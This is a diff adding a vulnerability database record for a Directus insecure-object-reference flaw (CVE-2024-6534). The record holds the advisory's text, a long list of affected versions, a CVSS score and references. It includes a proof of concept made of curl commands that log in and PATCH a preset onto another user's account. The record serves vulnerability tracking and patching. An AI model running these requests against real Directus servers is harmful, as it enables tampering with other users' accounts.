@@ -1,0 +1,362 @@
+advisory_id: GHSA-3fff-gqw3-vj86
+datasource_id: github_osv/GHSA-3fff-gqw3-vj86
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/08/GHSA-3fff-gqw3-vj86/GHSA-3fff-gqw3-vj86.json
+aliases:
+  - CVE-2024-6534
+summary: |
+  Directus has an insecure object reference via PATH presets
+  ### Impact
+  Directus v10.13.0 allows an authenticated external attacker to modify presets created by the same user to assign them to another user. This is possible because the application only validates the user parameter in the `POST /presets` request but not in the PATCH request. When chained with [CVE-2024-6533](https://github.com/directus/directus/security/advisories/GHSA-9qrm-48qf-r2rw), it could result in account takeover.
+
+  This vulnerability occurs because the application only validates the user parameter in the `POST /presets` request but not in the PATCH request.
+
+  ### PoC
+  To exploit this vulnerability, we need to do the follow steps using a non-administrative, default role attacker account.
+
+  1. Create a preset for a collection.
+
+  Store the preset id, or use it if it already exists from `GET /presets`. The following example will use the direct_users preset.
+
+  ```bash
+  TARGET_HOST="http://localhost:8055" ATTACKER_EMAIL="malicious@malicious.com" ATTACKER_PASSWORD="123456" root_dir=$(dirname $0) mkdir "${root_dir}/static" curl -s -k -o /dev/null -w "%{http_code}" -X 'POST' "${TARGET_HOST}/auth/login" \ -c "${root_dir}/static/attacker_directus_session_token" \ -H 'Content-Type: application/json' \ -d "{\"email\":\"${ATTACKER_EMAIL}\",\"password\":\"${ATTACKER_PASSWORD}\",\"mode\":\"session\"}" attacker_user_id=$(curl -s -k "${TARGET_HOST}/users/me" \ -b "${root_dir}/static/attacker_directus_session_token" | jq -r ".data.id") # Store all user's id curl -s -k "${TARGET_HOST}/users" \ -b "${root_dir}/static/attacker_directus_session_token" | jq -r ".data[] | select(.id != \"${attacker_user_id}\")" > "${root_dir}/static/users.json"
+
+  # Choose the victim user id from the previous request
+  victim_user_id="4f079119-2478-48c4-bd3a-30fa80c5f265"
+  users_preset_id=$(curl -s -k -X 'POST' "${TARGET_HOST}/presets" \
+    -H 'Content-Type: application/json' \
+    -b "${root_dir}/static/attacker_directus_session_token" \
+    --data-binary "{\"layout\":\"cards\",\"bookmark\":null,\"role\":null,\"user\":\"${attacker_user_id}\",\"search\":null,\"filter\":null,\"layout_query\":{\"cards\":{\"sort\":[\"email\"]}},\"layout_options\":{\"cards\":{\"icon\":\"account_circle\",\"title\":\"{{tittle}}\",\"subtitle\":\"{{ email }}\",\"size\":4}},\"refresh_interval\":null,\"icon\":\"bookmark\",\"color\":null,\"collection\":\"directus_users\"}"  | jq -r '.data.id')
+  ```
+
+  2. Modify the presets via `PATCH /presets/{id}`.
+
+  With the malicious configuration and the user ID to which you will assign the preset configuration. The user ID can be obtained from `GET /users`. The following example modifies the title parameter.
+
+  ```bash
+  curl -i -s -k -X 'PATCH' "${TARGET_HOST}/presets/${users_preset_id}" \
+      -H 'Content-Type: application/json' \
+      -b "${root_dir}/static/attacker_directus_session_token" \
+      --data-binary "{\"layout\":\"cards\",\"bookmark\":null,\"role\":null,\"user\":\"${victim_user_id}\",\"search\":null,\"filter\":null,\"layout_query\":{\"cards\":{\"sort\":[\"email\"]}},\"layout_options\":{\"cards\":{\"icon\":\"account_circle\",\"title\":\"PoC Assign another users presets\",\"subtitle\":\"fakeemail@fake.com\",\"size\":4}},\"refresh_interval\":null,\"icon\":\"bookmark\",\"color\":null,\"collection\":\"directus_users\"}"
+  ```
+
+  Notes:
+
+  Each new preset to a specific collection will have an integer consecutive id independent of the user who created it.
+
+  The user is the user id of the victim. The server will not validate that we assign a new user to a preset we own.
+
+  The app will use the first id preset with the lowest value it finds for a specific user and collection. If we control a preset with an id lower than the current preset id to the same collection of the victim user, we can attack that victim user, or if the victim has not yet defined a preset for that collection, then the preset id could be any value we control. Otherwise, the attacker user must have permission to modify or create the victim presets.
+
+  When the victim visits the views of the modified presets, it will be rendered with the new configuration applied.
+impacted_packages:
+  - purl: pkg:npm/directus
+    affected_versions: vers:npm/<=10.13.1
+    fixed_versions: vers:npm/10.13.2
+    affected_packages:
+      - pkg:npm/directus@0.1.0-preview.1
+      - pkg:npm/directus@0.1.0-preview.2
+      - pkg:npm/directus@0.1.0-preview.3
+      - pkg:npm/directus@0.1.0-preview.4
+      - pkg:npm/directus@0.1.0-preview.5
+      - pkg:npm/directus@0.1.0-preview.6
+      - pkg:npm/directus@0.1.0-preview.7
+      - pkg:npm/directus@0.1.0-preview.8
+      - pkg:npm/directus@0.1.0-preview.9
+      - pkg:npm/directus@0.1.0-preview.10
+      - pkg:npm/directus@0.1.0-preview.11
+      - pkg:npm/directus@0.1.0-preview.12
+      - pkg:npm/directus@0.1.0-preview.13
+      - pkg:npm/directus@0.1.0-preview.14
+      - pkg:npm/directus@0.1.0-preview.15
+      - pkg:npm/directus@0.1.0-preview.16
+      - pkg:npm/directus@0.1.0-preview.17
+      - pkg:npm/directus@0.1.0-preview.18
+      - pkg:npm/directus@0.1.0-preview.19
+      - pkg:npm/directus@0.1.0-preview.20
+      - pkg:npm/directus@0.1.0-preview.21
+      - pkg:npm/directus@0.1.0-preview.22
+      - pkg:npm/directus@0.1.0-preview.23
+      - pkg:npm/directus@0.1.0-preview.24
+      - pkg:npm/directus@9.0.0-alpha.1
+      - pkg:npm/directus@9.0.0-alpha.5
+      - pkg:npm/directus@9.0.0-alpha.7
+      - pkg:npm/directus@9.0.0-alpha.8
+      - pkg:npm/directus@9.0.0-alpha.9
+      - pkg:npm/directus@9.0.0-alpha.10
+      - pkg:npm/directus@9.0.0-alpha.14
+      - pkg:npm/directus@9.0.0-alpha.15
+      - pkg:npm/directus@9.0.0-alpha.16
+      - pkg:npm/directus@9.0.0-alpha.17
+      - pkg:npm/directus@9.0.0-alpha.18
+      - pkg:npm/directus@9.0.0-alpha.19
+      - pkg:npm/directus@9.0.0-alpha.20
+      - pkg:npm/directus@9.0.0-alpha.21
+      - pkg:npm/directus@9.0.0-alpha.22
+      - pkg:npm/directus@9.0.0-alpha.23
+      - pkg:npm/directus@9.0.0-alpha.25
+      - pkg:npm/directus@9.0.0-alpha.26
+      - pkg:npm/directus@9.0.0-alpha.27
+      - pkg:npm/directus@9.0.0-alpha.32
+      - pkg:npm/directus@9.0.0-alpha.33
+      - pkg:npm/directus@9.0.0-alpha.40
+      - pkg:npm/directus@9.0.0-alpha.41
+      - pkg:npm/directus@9.0.0-alpha.42
+      - pkg:npm/directus@9.0.0-beta.0
+      - pkg:npm/directus@9.0.0-beta.1
+      - pkg:npm/directus@9.0.0-beta.2
+      - pkg:npm/directus@9.0.0-beta.3
+      - pkg:npm/directus@9.0.0-beta.4
+      - pkg:npm/directus@9.0.0-beta.5
+      - pkg:npm/directus@9.0.0-beta.7
+      - pkg:npm/directus@9.0.0-beta.8
+      - pkg:npm/directus@9.0.0-beta.9
+      - pkg:npm/directus@9.0.0-beta.10
+      - pkg:npm/directus@9.0.0-beta.11
+      - pkg:npm/directus@9.0.0-beta.12
+      - pkg:npm/directus@9.0.0-beta.13
+      - pkg:npm/directus@9.0.0-beta.14
+      - pkg:npm/directus@9.0.0-rc.0
+      - pkg:npm/directus@9.0.0-rc.1
+      - pkg:npm/directus@9.0.0-rc.2
+      - pkg:npm/directus@9.0.0-rc.3
+      - pkg:npm/directus@9.0.0-rc.4
+      - pkg:npm/directus@9.0.0-rc.5
+      - pkg:npm/directus@9.0.0-rc.6
+      - pkg:npm/directus@9.0.0-rc.7
+      - pkg:npm/directus@9.0.0-rc.8
+      - pkg:npm/directus@9.0.0-rc.10
+      - pkg:npm/directus@9.0.0-rc.11
+      - pkg:npm/directus@9.0.0-rc.12
+      - pkg:npm/directus@9.0.0-rc.13
+      - pkg:npm/directus@9.0.0-rc.14
+      - pkg:npm/directus@9.0.0-rc.15
+      - pkg:npm/directus@9.0.0-rc.17
+      - pkg:npm/directus@9.0.0-rc.18
+      - pkg:npm/directus@9.0.0-rc.19
+      - pkg:npm/directus@9.0.0-rc.20
+      - pkg:npm/directus@9.0.0-rc.21
+      - pkg:npm/directus@9.0.0-rc.22
+      - pkg:npm/directus@9.0.0-rc.23
+      - pkg:npm/directus@9.0.0-rc.24
+      - pkg:npm/directus@9.0.0-rc.25
+      - pkg:npm/directus@9.0.0-rc.26
+      - pkg:npm/directus@9.0.0-rc.27
+      - pkg:npm/directus@9.0.0-rc.28
+      - pkg:npm/directus@9.0.0-rc.29
+      - pkg:npm/directus@9.0.0-rc.30
+      - pkg:npm/directus@9.0.0-rc.31
+      - pkg:npm/directus@9.0.0-rc.32
+      - pkg:npm/directus@9.0.0-rc.33
+      - pkg:npm/directus@9.0.0-rc.34
+      - pkg:npm/directus@9.0.0-rc.35
+      - pkg:npm/directus@9.0.0-rc.36
+      - pkg:npm/directus@9.0.0-rc.37
+      - pkg:npm/directus@9.0.0-rc.38
+      - pkg:npm/directus@9.0.0-rc.39
+      - pkg:npm/directus@9.0.0-rc.40
+      - pkg:npm/directus@9.0.0-rc.41
+      - pkg:npm/directus@9.0.0-rc.42
+      - pkg:npm/directus@9.0.0-rc.43
+      - pkg:npm/directus@9.0.0-rc.44
+      - pkg:npm/directus@9.0.0-rc.45
+      - pkg:npm/directus@9.0.0-rc.46
+      - pkg:npm/directus@9.0.0-rc.48
+      - pkg:npm/directus@9.0.0-rc.49
+      - pkg:npm/directus@9.0.0-rc.50
+      - pkg:npm/directus@9.0.0-rc.51
+      - pkg:npm/directus@9.0.0-rc.52
+      - pkg:npm/directus@9.0.0-rc.53
+      - pkg:npm/directus@9.0.0-rc.54
+      - pkg:npm/directus@9.0.0-rc.55
+      - pkg:npm/directus@9.0.0-rc.56
+      - pkg:npm/directus@9.0.0-rc.57
+      - pkg:npm/directus@9.0.0-rc.58
+      - pkg:npm/directus@9.0.0-rc.59
+      - pkg:npm/directus@9.0.0-rc.60
+      - pkg:npm/directus@9.0.0-rc.61
+      - pkg:npm/directus@9.0.0-rc.62
+      - pkg:npm/directus@9.0.0-rc.63
+      - pkg:npm/directus@9.0.0-rc.64
+      - pkg:npm/directus@9.0.0-rc.66
+      - pkg:npm/directus@9.0.0-rc.67
+      - pkg:npm/directus@9.0.0-rc.68
+      - pkg:npm/directus@9.0.0-rc.69
+      - pkg:npm/directus@9.0.0-rc.70
+      - pkg:npm/directus@9.0.0-rc.71
+      - pkg:npm/directus@9.0.0-rc.72
+      - pkg:npm/directus@9.0.0-rc.73
+      - pkg:npm/directus@9.0.0-rc.74
+      - pkg:npm/directus@9.0.0-rc.75
+      - pkg:npm/directus@9.0.0-rc.76
+      - pkg:npm/directus@9.0.0-rc.77
+      - pkg:npm/directus@9.0.0-rc.78
+      - pkg:npm/directus@9.0.0-rc.79
+      - pkg:npm/directus@9.0.0-rc.80
+      - pkg:npm/directus@9.0.0-rc.81
+      - pkg:npm/directus@9.0.0-rc.82
+      - pkg:npm/directus@9.0.0-rc.83
+      - pkg:npm/directus@9.0.0-rc.84
+      - pkg:npm/directus@9.0.0-rc.85
+      - pkg:npm/directus@9.0.0-rc.86
+      - pkg:npm/directus@9.0.0-rc.87
+      - pkg:npm/directus@9.0.0-rc.88
+      - pkg:npm/directus@9.0.0-rc.89
+      - pkg:npm/directus@9.0.0-rc.90
+      - pkg:npm/directus@9.0.0-rc.91
+      - pkg:npm/directus@9.0.0-rc.92
+      - pkg:npm/directus@9.0.0-rc.93
+      - pkg:npm/directus@9.0.0-rc.94
+      - pkg:npm/directus@9.0.0-rc.95
+      - pkg:npm/directus@9.0.0-rc.96
+      - pkg:npm/directus@9.0.0-rc.97
+      - pkg:npm/directus@9.0.0-rc.98
+      - pkg:npm/directus@9.0.0-rc.99
+      - pkg:npm/directus@9.0.0-rc.100
+      - pkg:npm/directus@9.0.0-rc.101
+      - pkg:npm/directus@9.0.0
+      - pkg:npm/directus@9.0.1
+      - pkg:npm/directus@9.1.0
+      - pkg:npm/directus@9.1.1
+      - pkg:npm/directus@9.1.2
+      - pkg:npm/directus@9.2.0
+      - pkg:npm/directus@9.2.1
+      - pkg:npm/directus@9.2.2
+      - pkg:npm/directus@9.3.0
+      - pkg:npm/directus@9.4.0
+      - pkg:npm/directus@9.4.1
+      - pkg:npm/directus@9.4.2
+      - pkg:npm/directus@9.4.3
+      - pkg:npm/directus@9.5.0
+      - pkg:npm/directus@9.5.1
+      - pkg:npm/directus@9.5.2
+      - pkg:npm/directus@9.6.0
+      - pkg:npm/directus@9.7.0
+      - pkg:npm/directus@9.7.1
+      - pkg:npm/directus@9.8.0
+      - pkg:npm/directus@9.9.0
+      - pkg:npm/directus@9.9.1
+      - pkg:npm/directus@9.10.0
+      - pkg:npm/directus@9.11.0
+      - pkg:npm/directus@9.11.1
+      - pkg:npm/directus@9.12.0
+      - pkg:npm/directus@9.12.1
+      - pkg:npm/directus@9.12.2
+      - pkg:npm/directus@9.13.0
+      - pkg:npm/directus@9.14.0
+      - pkg:npm/directus@9.14.1
+      - pkg:npm/directus@9.14.2
+      - pkg:npm/directus@9.14.3
+      - pkg:npm/directus@9.14.5
+      - pkg:npm/directus@9.15.0
+      - pkg:npm/directus@9.15.1
+      - pkg:npm/directus@9.16.0
+      - pkg:npm/directus@9.16.1
+      - pkg:npm/directus@9.17.0
+      - pkg:npm/directus@9.17.1
+      - pkg:npm/directus@9.17.2
+      - pkg:npm/directus@9.17.3
+      - pkg:npm/directus@9.17.4
+      - pkg:npm/directus@9.18.0
+      - pkg:npm/directus@9.18.1
+      - pkg:npm/directus@9.19.0
+      - pkg:npm/directus@9.19.1
+      - pkg:npm/directus@9.19.2
+      - pkg:npm/directus@9.20.0
+      - pkg:npm/directus@9.20.1
+      - pkg:npm/directus@9.20.2
+      - pkg:npm/directus@9.20.3
+      - pkg:npm/directus@9.20.4
+      - pkg:npm/directus@9.21.0
+      - pkg:npm/directus@9.21.2
+      - pkg:npm/directus@9.22.0
+      - pkg:npm/directus@9.22.1
+      - pkg:npm/directus@9.22.3
+      - pkg:npm/directus@9.22.4
+      - pkg:npm/directus@9.23.1
+      - pkg:npm/directus@9.23.3
+      - pkg:npm/directus@9.23.4
+      - pkg:npm/directus@9.24.0
+      - pkg:npm/directus@9.25.0
+      - pkg:npm/directus@9.25.1
+      - pkg:npm/directus@9.25.2
+      - pkg:npm/directus@9.26.0
+      - pkg:npm/directus@10.0.0
+      - pkg:npm/directus@10.1.0
+      - pkg:npm/directus@10.1.1
+      - pkg:npm/directus@10.2.0
+      - pkg:npm/directus@10.2.1
+      - pkg:npm/directus@10.3.0
+      - pkg:npm/directus@10.3.1
+      - pkg:npm/directus@10.4.1
+      - pkg:npm/directus@10.4.2
+      - pkg:npm/directus@10.4.3
+      - pkg:npm/directus@10.5.0
+      - pkg:npm/directus@10.5.1
+      - pkg:npm/directus@10.5.2
+      - pkg:npm/directus@10.5.3
+      - pkg:npm/directus@10.6.0
+      - pkg:npm/directus@10.6.1
+      - pkg:npm/directus@10.6.2
+      - pkg:npm/directus@10.6.3
+      - pkg:npm/directus@10.6.4
+      - pkg:npm/directus@10.7.0-beta.0
+      - pkg:npm/directus@10.7.0
+      - pkg:npm/directus@10.7.1
+      - pkg:npm/directus@10.7.2
+      - pkg:npm/directus@10.8.0
+      - pkg:npm/directus@10.8.1
+      - pkg:npm/directus@10.8.2
+      - pkg:npm/directus@10.8.3
+      - pkg:npm/directus@10.9.0
+      - pkg:npm/directus@10.9.1
+      - pkg:npm/directus@10.9.2
+      - pkg:npm/directus@10.9.3
+      - pkg:npm/directus@10.10.0
+      - pkg:npm/directus@10.10.1
+      - pkg:npm/directus@10.10.2
+      - pkg:npm/directus@10.10.3
+      - pkg:npm/directus@10.10.4
+      - pkg:npm/directus@10.10.5
+      - pkg:npm/directus@10.10.6
+      - pkg:npm/directus@10.10.7
+      - pkg:npm/directus@10.11.0
+      - pkg:npm/directus@10.11.1
+      - pkg:npm/directus@10.11.2
+      - pkg:npm/directus@10.12.0
+      - pkg:npm/directus@10.12.1
+      - pkg:npm/directus@10.13.0
+      - pkg:npm/directus@10.13.1
+    fixed_packages:
+      - pkg:npm/directus@10.13.2
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '4.1'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:N/I:L/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/08/GHSA-3fff-gqw3-vj86/GHSA-3fff-gqw3-vj86.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-639
+references:
+  - url: https://directus.io
+    reference_type:
+    reference_id:
+  - url: https://fluidattacks.com/advisories/capaldi
+    reference_type:
+    reference_id:
+  - url: https://github.com/directus/directus
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2024-6534
+    reference_type:
+    reference_id: CVE-2024-6534
+  - url: https://github.com/directus/directus/security/advisories/GHSA-3fff-gqw3-vj86
+    reference_type:
+    reference_id: GHSA-3fff-gqw3-vj86
+exploits: []
